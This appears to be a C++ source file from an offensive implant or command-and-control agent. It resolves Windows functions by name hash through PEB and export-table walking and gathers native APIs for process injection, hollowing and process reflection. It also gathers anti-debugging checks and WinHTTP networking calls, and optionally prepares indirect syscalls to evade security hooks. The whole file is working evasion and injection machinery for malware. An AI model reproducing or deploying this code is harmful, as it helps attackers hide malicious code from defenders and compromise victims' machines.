#include "core/procs.hpp"

namespace Procs
{
    ULONG StringToHashModule(WCHAR* wStr, SIZE_T dwStrLen)
    {
        ULONG  dwHash   = HASH_IV;
        WCHAR* pwStr    = wStr;
        SIZE_T dwCnt    = 0;

        do
        {
            WCHAR c = *pwStr;

            if (!c)
            {
                break;
            }

            // If a character is uppercase, convert it to lowercase.
            if (c >= L'A' && c <= L'Z')
            {
                c += L'a' - L'A';
            }

            dwHash = dwHash * RANDOM_ADDR + c;
            ++pwStr;
            dwCnt++;

            if (dwStrLen > 0 && dwCnt >= dwStrLen)
            {
                break;
            }
        } while (TRUE);

        return dwHash & 0xFFFFFFFF;
    }

    DWORD StringToHashFunc(char* str)
    {
        int c;
        DWORD dwHash = HASH_IV;

        while (c = *str++)
        {
            dwHash = dwHash * RANDOM_ADDR + c;
        }

        return dwHash & 0xFFFFFFFF;
    }

    PVOID GetModuleByHash(DWORD dwHash)
    {
        PPEB pPeb = (PPEB)PPEB_PTR;
        PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
        
        // Get the first entry
        PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pLdr->InLoadOrderModuleList.Flink;

        while (pDte)
        {   
            if (StringToHashModule(pDte->BaseDllName.Buffer, pDte->BaseDllName.Length) == dwHash)
            {
                return pDte->DllBase;
            }

            // Get the next entry
            pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
        }

        return nullptr;
    }

    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD   dwHash
    ) {
        PVOID pFuncAddr = nullptr;

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + pDosHeader->e_lfanew);

        DWORD_PTR dwpExportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + dwpExportDirRVA);

        PDWORD pdwAddrOfFuncsRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfFunctions);
        PDWORD pdwAddrOfNamesRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNames);
        PWORD pdwAddrOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++)
        {
            DWORD dwFuncNameRVA = pdwAddrOfNamesRVA[i];
            DWORD_PTR dwpFuncNameRVA = (DWORD_PTR)hModule + dwFuncNameRVA;
            char* sFuncName = (char*)dwpFuncNameRVA;
            DWORD_PTR dwpFuncAddrRVA = 0;

            DWORD dwFuncNameHash = StringToHashFunc(sFuncName);
            if (dwFuncNameHash == dwHash)
            {
                dwpFuncAddrRVA = pdwAddrOfFuncsRVA[pdwAddrOfNameOrdinalsRVA[i]];
                pFuncAddr = (PVOID)((DWORD_PTR)hModule + dwpFuncAddrRVA);
                return pFuncAddr;
            }
        }

        return nullptr;
    }

    PPROCS FindProcs(
        HMODULE hNTDLL,
        HMODULE hKernel32DLL,
        HMODULE hWinHTTPDLL,
        BOOL    bIndirectSyscall
    ) {
        PPROCS pProcs = new PROCS;

        // NTAPI
        PVOID pNtAllocateVirtualMemory          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTALLOCATEVIRTUALMEMORY);
        pProcs->lpNtAllocateVirtualMemory       = reinterpret_cast<LPPROC_NTALLOCATEVIRTUALMEMORY>(pNtAllocateVirtualMemory);
        PVOID pNtClose                          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCLOSE);
        pProcs->lpNtClose                       = reinterpret_cast<LPPROC_NTCLOSE>(pNtClose);
        PVOID pNtCreateFile                     = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATEFILE);
        pProcs->lpNtCreateFile                  = reinterpret_cast<LPPROC_NTCREATEFILE>(pNtCreateFile);
        PVOID pNtCreateProcessEx                = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATEPROCESSEX);
        pProcs->lpNtCreateProcessEx             = reinterpret_cast<LPPROC_NTCREATEPROCESSEX>(pNtCreateProcessEx);
        PVOID pNtCreateSection                  = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATESECTION);
        pProcs->lpNtCreateSection               = reinterpret_cast<LPPROC_NTCREATESECTION>(pNtCreateSection);
        PVOID pNtCreateThreadEx                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATETHREADEX);
        pProcs->lpNtCreateThreadEx              = reinterpret_cast<LPPROC_NTCREATETHREADEX>(pNtCreateThreadEx);
        PVOID pNtDuplicateObject                = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTDUPLICATEOBJECT);
        pProcs->lpNtDuplicateObject             = reinterpret_cast<LPPROC_NTDUPLICATEOBJECT>(pNtDuplicateObject);
        PVOID pNtFreeVirtualMemory              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTFREEVIRTUALMEMORY);
        pProcs->lpNtFreeVirtualMemory           = reinterpret_cast<LPPROC_NTFREEVIRTUALMEMORY>(pNtFreeVirtualMemory);
        PVOID pNtGetContextThread               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTGETCONTEXTTHREAD);
        pProcs->lpNtGetContextThread            = reinterpret_cast<LPPROC_NTGETCONTEXTTHREAD>(pNtGetContextThread);
        PVOID pNtMapViewOfSection               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTMAPVIEWOFSECTION);
        pProcs->lpNtMapViewOfSection            = reinterpret_cast<LPPROC_NTMAPVIEWOFSECTION>(pNtMapViewOfSection);
        PVOID pNtOpenProcess                    = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENPROCESS);
        pProcs->lpNtOpenProcess                 = reinterpret_cast<LPPROC_NTOPENPROCESS>(pNtOpenProcess);
        PVOID pNtOpenProcessToken               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENPROCESSTOKEN);
        pProcs->lpNtOpenProcessToken            = reinterpret_cast<LPPROC_NTOPENPROCESSTOKEN>(pNtOpenProcessToken);
        PVOID pNtOpenThread                     = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENTHREAD);
        pProcs->lpNtOpenThread                  = reinterpret_cast<LPPROC_NTOPENTHREAD>(pNtOpenThread);
        PVOID pNtProtectVirtualMemory           = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTPROTECTVIRTUALMEMORY);
        pProcs->lpNtProtectVirtualMemory        = reinterpret_cast<LPPROC_NTPROTECTVIRTUALMEMORY>(pNtProtectVirtualMemory);
        PVOID pNtQueryInformationFile           = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONFILE);
        pProcs->lpNtQueryInformationFile        = reinterpret_cast<LPPROC_NTQUERYINFORMATIONFILE>(pNtQueryInformationFile);
        PVOID pNtQueryInformationProcess        = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONPROCESS);
        pProcs->lpNtQueryInformationProcess     = reinterpret_cast<LPPROC_NTQUERYINFORMATIONPROCESS>(pNtQueryInformationProcess);
        PVOID pNtQueryVirtualMemory             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYVIRTUALMEMORY);
        pProcs->lpNtQueryVirtualMemory          = reinterpret_cast<LPPROC_NTQUERYVIRTUALMEMORY>(pNtQueryVirtualMemory);
        PVOID pNtReadFile                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTREADFILE);
        pProcs->lpNtReadFile                    = reinterpret_cast<LPPROC_NTREADFILE>(pNtReadFile);
        PVOID pNtReadVirtualMemory              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTREADVIRTUALMEMORY);
        pProcs->lpNtReadVirtualMemory           = reinterpret_cast<LPPROC_NTREADVIRTUALMEMORY>(pNtReadVirtualMemory);
        PVOID pNtResumeThread                   = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTRESUMETHREAD);
        pProcs->lpNtResumeThread                = reinterpret_cast<LPPROC_NTRESUMETHREAD>(pNtResumeThread);
        PVOID pNtSetContextThread               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSETCONTEXTTHREAD);
        pProcs->lpNtSetContextThread            = reinterpret_cast<LPPROC_NTSETCONTEXTTHREAD>(pNtSetContextThread);
        PVOID pNtSetInformationProcess          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSETINFORMATIONPROCESS);
        pProcs->lpNtSetInformationProcess       = reinterpret_cast<LPPROC_NTSETINFORMATIONPROCESS>(pNtSetInformationProcess);
        PVOID pNtTerminateProcess               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTTERMINATEPROCESS);
        pProcs->lpNtTerminateProcess            = reinterpret_cast<LPPROC_NTTERMINATEPROCESS>(pNtTerminateProcess);
        PVOID pNtUnmapViewOfSection             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTUNMAPVIEWOFSECTION);
        pProcs->lpNtUnmapViewOfSection          = reinterpret_cast<LPPROC_NTUNMAPVIEWOFSECTION>(pNtUnmapViewOfSection);
        PVOID pNtWaitForSingleObject            = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWAITFORSINGLEOBJECT);
        pProcs->lpNtWaitForSingleObject         = reinterpret_cast<LPPROC_NTWAITFORSINGLEOBJECT>(pNtWaitForSingleObject);
        PVOID pNtWriteFile                      = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWRITEFILE);
        pProcs->lpNtWriteFile                   = reinterpret_cast<LPPROC_NTWRITEFILE>(pNtWriteFile);
        PVOID pNtWriteVirtualMemory             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWRITEVIRTUALMEMORY);
        pProcs->lpNtWriteVirtualMemory          = reinterpret_cast<LPPROC_NTWRITEVIRTUALMEMORY>(pNtWriteVirtualMemory);
        PVOID pRtlAllocateHeap                  = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLALLOCATEHEAP);
        pProcs->lpRtlAllocateHeap               = reinterpret_cast<LPPROC_RTLALLOCATEHEAP>(pRtlAllocateHeap);
        PVOID pRtlCreateProcessReflection       = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLCREATEPROCESSREFLECTION);
        pProcs->lpRtlCreateProcessReflection    = reinterpret_cast<LPPROC_RTLCREATEPROCESSREFLECTION>(pRtlCreateProcessReflection);
        PVOID pRtlCreateUserThread              = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLCREATEUSERTHREAD);
        pProcs->lpRtlCreateUserThread           = reinterpret_cast<LPPROC_RTLCREATEUSERTHREAD>(pRtlCreateUserThread);
        PVOID pRtlGetFullPathName_U             = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLGETFULLPATHNAME_U);
        pProcs->lpRtlGetFullPathName_U          = reinterpret_cast<LPPROC_RTLGETFULLPATHNAME_U>(pRtlGetFullPathName_U);
        PVOID pRtlInitUnicodeString             = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLINITUNICODESTRING);
        pProcs->lpRtlInitUnicodeString          = reinterpret_cast<LPPROC_RTLINITUNICODESTRING>(pRtlInitUnicodeString);
        PVOID pRtlStringCchCatW                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHCATW);
        pProcs->lpRtlStringCchCatW              = reinterpret_cast<LPPROC_RTLSTRINGCCHCATW>(pRtlStringCchCatW);
        PVOID pRtlStringCchCopyW                = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHCOPYW);
        pProcs->lpRtlStringCchCopyW             = reinterpret_cast<LPPROC_RTLSTRINGCCHCOPYW>(pRtlStringCchCopyW);
        PVOID pRtlStringCchLengthW              = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHLENGTHW);
        pProcs->lpRtlStringCchLengthW           = reinterpret_cast<LPPROC_RTLSTRINGCCHLENGTHW>(pRtlStringCchLengthW);
        PVOID pRtlZeroMemory                    = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLZEROMEMORY);
        pProcs->lpRtlZeroMemory                 = reinterpret_cast<LPPROC_RTLZEROMEMORY>(pRtlZeroMemory);

        // WINAPI
        PVOID pCheckRemoteDebuggerPresent       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CHECKREMOTEDEBUGGERPRESENT);
        pProcs->lpCheckRemoteDebuggerPresent    = reinterpret_cast<LPPROC_CHECKREMOTEDEBUGGERPRESENT>(pCheckRemoteDebuggerPresent);
        PVOID pCreateThreadpoolWait             = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CREATETHREADPOOLWAIT);
        pProcs->lpCreateThreadpoolWait          = reinterpret_cast<LPPROC_CREATETHREADPOOLWAIT>(pCreateThreadpoolWait);
        PVOID pGetProcAddress                   = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_GETPROCADDRESS);
        pProcs->lpGetProcAddress                = reinterpret_cast<LPPROC_GETPROCADDRESS>(pGetProcAddress);
        PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_ISDEBUGGERPRESENT);
        pProcs->lpIsDebuggerPresent             = reinterpret_cast<LPPROC_ISDEBUGGERPRESENT>(pIsDebuggerPresent);
        PVOID pLoadLibraryA                     = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_LOADLIBRARYA);
        pProcs->lpLoadLibraryA                  = reinterpret_cast<LPPROC_LOADLIBRARYA>(pLoadLibraryA);
        PVOID pLoadLibraryW                     = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_LOADLIBRARYW);
        pProcs->lpLoadLibraryW                  = reinterpret_cast<LPPROC_LOADLIBRARYW>(pLoadLibraryW);
        PVOID pMessageBoxA                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_MESSAGEBOXA);
        pProcs->lpMessageBoxA                   = reinterpret_cast<LPPROC_MESSAGEBOXA>(pMessageBoxA);
        PVOID pMessageBoxW                      = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_MESSAGEBOXW);
        pProcs->lpMessageBoxW                   = reinterpret_cast<LPPROC_MESSAGEBOXW>(pMessageBoxW);
        PVOID pSetThreadpoolWait                = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_SETTHREADPOOLWAIT);
        pProcs->lpSetThreadpoolWait             = reinterpret_cast<LPPROC_SETTHREADPOOLWAIT>(pSetThreadpoolWait);
        PVOID pVirtualAlloc                     = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_VIRTUALALLOC);
        pProcs->lpVirtualAlloc                  = reinterpret_cast<LPPROC_VIRTUALALLOC>(pVirtualAlloc);
        PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCLOSEHANDLE);
        pProcs->lpWinHttpCloseHandle            = reinterpret_cast<LPPROC_WINHTTPCLOSEHANDLE>(pWinHttpCloseHandle);
        PVOID pWinHttpConnect                   = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCONNECT);
        pProcs->lpWinHttpConnect                = reinterpret_cast<LPPROC_WINHTTPCONNECT>(pWinHttpConnect);
        PVOID pWinHttpOpen                      = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPOPEN);
        pProcs->lpWinHttpOpen                   = reinterpret_cast<LPPROC_WINHTTPOPEN>(pWinHttpOpen);
        PVOID pWinHttpOpenRequest               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPOPENREQUEST);
        pProcs->lpWinHttpOpenRequest            = reinterpret_cast<LPPROC_WINHTTPOPENREQUEST>(pWinHttpOpenRequest);
        PVOID pWinHttpQueryDataAvailable        = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
        pProcs->lpWinHttpQueryDataAvailable     = reinterpret_cast<LPPROC_WINHTTPQUERYDATAAVAILABLE>(pWinHttpQueryDataAvailable);
        PVOID pWinHttpQueryHeaders              = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPQUERYHEADERS);
        pProcs->lpWinHttpQueryHeaders           = reinterpret_cast<LPPROC_WINHTTPQUERYHEADERS>(pWinHttpQueryHeaders);
        PVOID pWinHttpReadData                  = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPREADDATA);
        pProcs->lpWinHttpReadData               = reinterpret_cast<LPPROC_WINHTTPREADDATA>(pWinHttpReadData);
        PVOID pWinHttpReceiveResponse           = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPRECEIVERESPONSE);
        pProcs->lpWinHttpReceiveResponse        = reinterpret_cast<LPPROC_WINHTTPRECEIVERESPONSE>(pWinHttpReceiveResponse);
        PVOID pWinHttpSendRequest               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSENDREQUEST);
        pProcs->lpWinHttpSendRequest            = reinterpret_cast<LPPROC_WINHTTPSENDREQUEST>(pWinHttpSendRequest);
        PVOID pWinHttpSetOption                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSETOPTION);
        pProcs->lpWinHttpSetOption              = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
        PVOID pWinHttpWriteData                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPWRITEDATA);
        pProcs->lpWinHttpWriteData              = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);

        if (bIndirectSyscall)
        {
            pProcs->sysNtAllocateVirtualMemory      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAllocateVirtualMemory));
            pProcs->sysNtClose                      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtClose));
            pProcs->sysNtCreateFile                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateFile));
            pProcs->sysNtCreateProcessEx            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateProcessEx));
            pProcs->sysNtCreateSection              = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateSection));
            pProcs->sysNtCreateThreadEx             = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateThreadEx));
            pProcs->sysNtFreeVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFreeVirtualMemory));
            pProcs->sysNtGetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtGetContextThread));
            pProcs->sysNtMapViewOfSection           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtMapViewOfSection));
            pProcs->sysNtOpenProcess                = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcess));
            pProcs->sysNtOpenProcessToken           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcessToken));
            pProcs->sysNtOpenThread                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenThread));
            pProcs->sysNtProtectVirtualMemory       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtProtectVirtualMemory));
            pProcs->sysNtQueryInformationFile       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationFile));
            pProcs->sysNtQueryInformationProcess    = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationProcess));
            pProcs->sysNtQueryVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryVirtualMemory));
            pProcs->sysNtReadFile                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadFile));
            pProcs->sysNtReadVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadVirtualMemory));
            pProcs->sysNtResumeThread               = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtResumeThread));
            pProcs->sysNtSetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetContextThread));
            pProcs->sysNtSetInformationProcess      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetInformationProcess));
            pProcs->sysNtTerminateProcess           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtTerminateProcess));
            pProcs->sysNtUnmapViewOfSection         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtUnmapViewOfSection));
            pProcs->sysNtWaitForSingleObject        = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWaitForSingleObject));
            pProcs->sysNtWriteVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteVirtualMemory));
            pProcs->sysNtWriteFile                  = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteFile));
            pProcs->sysRtlCreateProcessReflection   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlCreateProcessReflection));
            pProcs->sysRtlCreateUserThread          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlCreateUserThread));
            pProcs->sysRtlInitUnicodeString         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlInitUnicodeString));
            pProcs->sysRtlGetFullPathName_U         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlGetFullPathName_U));
        }

        return pProcs;
    }
}